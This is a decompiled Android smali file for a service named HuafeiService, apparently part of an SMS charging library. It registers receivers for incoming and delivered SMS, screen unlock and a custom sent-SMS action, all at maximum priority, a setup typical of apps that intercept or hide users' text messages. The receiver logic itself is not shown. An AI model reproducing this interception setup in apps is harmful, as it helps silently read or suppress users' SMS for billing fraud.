.class public Lorg/hj201606/lib/sms/HuafeiService;
.super Landroid/app/Service;


# static fields
.field public static huafeiReceiver:Lorg/hj201606/lib/sms/HuafeiReceiver;


# instance fields
.field a:Lorg/hj201606/lib/sms/SentIntent;

.field b:Z

.field c:Landroid/os/IBinder;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    new-instance v0, Lorg/hj201606/lib/sms/HuafeiReceiver;

    invoke-direct {v0}, Lorg/hj201606/lib/sms/HuafeiReceiver;-><init>()V

    sput-object v0, Lorg/hj201606/lib/sms/HuafeiService;->huafeiReceiver:Lorg/hj201606/lib/sms/HuafeiReceiver;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    new-instance v0, Lorg/hj201606/lib/sms/SentIntent;

    invoke-direct {v0}, Lorg/hj201606/lib/sms/SentIntent;-><init>()V

    iput-object v0, p0, Lorg/hj201606/lib/sms/HuafeiService;->a:Lorg/hj201606/lib/sms/SentIntent;

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/HuafeiService;->c:Landroid/os/IBinder;

    return-object v0
.end method

.method public onCreate()V
    .locals 3

    :try_start_0
    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    const v1, 0x7fffffff

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->setPriority(I)V

    sget-object v1, Lorg/hj201606/lib/sms/HuafeiService;->huafeiReceiver:Lorg/hj201606/lib/sms/HuafeiReceiver;

    invoke-virtual {p0, v1, v0}, Lorg/hj201606/lib/sms/HuafeiService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "android.provider.Telephony.SMS_DELIVER"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    const v2, 0x7fffffff

    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->setPriority(I)V

    sget-object v2, Lorg/hj201606/lib/sms/HuafeiService;->huafeiReceiver:Lorg/hj201606/lib/sms/HuafeiReceiver;

    invoke-virtual {p0, v2, v1}, Lorg/hj201606/lib/sms/HuafeiService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "android.intent.action.USER_PRESENT"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    const v2, 0x7fffffff

    invoke-virtual {v0, v2}, Landroid/content/IntentFilter;->setPriority(I)V

    sget-object v0, Lorg/hj201606/lib/sms/HuafeiService;->huafeiReceiver:Lorg/hj201606/lib/sms/HuafeiReceiver;

    invoke-virtual {p0, v0, v1}, Lorg/hj201606/lib/sms/HuafeiService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "SENT_SMS_ACTION_HEJU"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    const v1, 0x7fffffff

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->setPriority(I)V

    iget-object v1, p0, Lorg/hj201606/lib/sms/HuafeiService;->a:Lorg/hj201606/lib/sms/SentIntent;

    invoke-virtual {p0, v1, v0}, Lorg/hj201606/lib/sms/HuafeiService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public onDestroy()V
    .locals 1

    :try_start_0
    sget-object v0, Lorg/hj201606/lib/sms/HuafeiService;->huafeiReceiver:Lorg/hj201606/lib/sms/HuafeiReceiver;

    invoke-virtual {p0, v0}, Lorg/hj201606/lib/sms/HuafeiService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    iget-object v0, p0, Lorg/hj201606/lib/sms/HuafeiService;->a:Lorg/hj201606/lib/sms/SentIntent;

    invoke-virtual {p0, v0}, Lorg/hj201606/lib/sms/HuafeiService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public onRebind(Landroid/content/Intent;)V
    .locals 0

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 4

    const v3, 0x7fffffff

    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v3}, Landroid/content/IntentFilter;->setPriority(I)V

    sget-object v1, Lorg/hj201606/lib/sms/HuafeiService;->huafeiReceiver:Lorg/hj201606/lib/sms/HuafeiReceiver;

    invoke-virtual {p0, v1, v0}, Lorg/hj201606/lib/sms/HuafeiService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "android.provider.Telephony.SMS_DELIVER"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v3}, Landroid/content/IntentFilter;->setPriority(I)V

    sget-object v2, Lorg/hj201606/lib/sms/HuafeiService;->huafeiReceiver:Lorg/hj201606/lib/sms/HuafeiReceiver;

    invoke-virtual {p0, v2, v1}, Lorg/hj201606/lib/sms/HuafeiService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "android.intent.action.USER_PRESENT"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v3}, Landroid/content/IntentFilter;->setPriority(I)V

    sget-object v0, Lorg/hj201606/lib/sms/HuafeiService;->huafeiReceiver:Lorg/hj201606/lib/sms/HuafeiReceiver;

    invoke-virtual {p0, v0, v1}, Lorg/hj201606/lib/sms/HuafeiService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "huafeiReceiver_________________register"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "SENT_SMS_ACTION_HEJU"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v3}, Landroid/content/IntentFilter;->setPriority(I)V

    iget-object v1, p0, Lorg/hj201606/lib/sms/HuafeiService;->a:Lorg/hj201606/lib/sms/SentIntent;

    invoke-virtual {p0, v1, v0}, Lorg/hj201606/lib/sms/HuafeiService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "sentIntent_________________register"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result v0

    return v0
.end method

.method public onUnbind(Landroid/content/Intent;)Z
    .locals 1

    iget-boolean v0, p0, Lorg/hj201606/lib/sms/HuafeiService;->b:Z

    return v0
.end method
